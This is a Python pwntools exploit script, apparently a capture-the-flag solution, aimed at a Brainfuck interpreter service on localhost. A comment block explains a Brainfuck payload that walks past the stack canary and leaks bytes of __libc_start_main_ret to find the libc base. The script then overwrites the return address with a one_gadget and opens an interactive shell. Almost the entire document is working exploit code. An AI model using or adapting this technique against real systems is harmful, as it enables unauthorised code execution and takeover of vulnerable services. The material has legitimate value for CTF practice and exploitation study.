from pwn import *
import time

# Exploit uses unnecessary communication --> optimize <--
# Should just read over zero bytes instead of outputting them

bf_expl = open("leak_r_w.bf", "rb").read()

"""
The brainfuck part consist of:
Subroutine: Print out current byte and write input that has been sent.
This subroutine exits when the character "!" is inputted:
[+++++++++++++++++++++++++++++++++>.,---------------------------------]
>.

Subroutine: Go right until null byte (used to go over loaded bf-program without breaking it)
[>.]
>+

Same subroutine as above. Used to go over stack until interesting section starts
[+++++++++++++++++++++++++++++++++>.,---------------------------------]

Go over crap on stack, especially over stack canary (getchar doesnt let us write null bytes)
>>>>>>>>>>>>>>>>>>

Leak last 3 bytes of __libc_start_main_ret
.>.>.

Write new last 3 bytes for one gadget in libc
,<,<,>>
"""
r = remote('localhost', 19783)

# Send brainfuck and input.
# bf-buffer is 30k bytes long.
# Overwrite null bytes (useless) with X, until we reach program
r.send(bf_expl + b"X" * (29998))
# End subroutine for overwriting
r.send(b"!")

# Read until end of bf-program
print(r.recvuntil(bf_expl[-10:]))

# Go over rest of bf-program-buffer
# Until we reach interesting part of stack
for _ in range(1000 - 126 - 6 - 49):
    tmp = r.recvn(1)
    
    print("--> tmp", tmp)
    if tmp == b"\x00":
        tmp = b"\x01"
        print("Replaced by 0x01")
    r.send(tmp)
r.send(b"!")


# Leak libc base address
libc_ret_addr = b""

libc_ret = r.recvn(5)[-3:][::-1]
libc_ret_num = int.from_bytes(libc_ret, "big")
print("__libc_start_main_ret addr [last 3 bytes]", libc_ret.hex(), hex(libc_ret_num))

libc_base = libc_ret_num - 8347
print("Libc base [last 3 bytes]", hex(libc_base))

one_gad_offset = 0xc3456
one_gadget_addr = libc_base + one_gad_offset
one_gadget_addr_b = int.to_bytes(one_gadget_addr, 3, "big")

print("Address of one gadget [last 3 bytes]", one_gadget_addr_b.hex())

print("Zerfickung")
# Write adress of one_gadget over return address
r.send(one_gadget_addr_b)

# Enjoy shell
r.interactive()
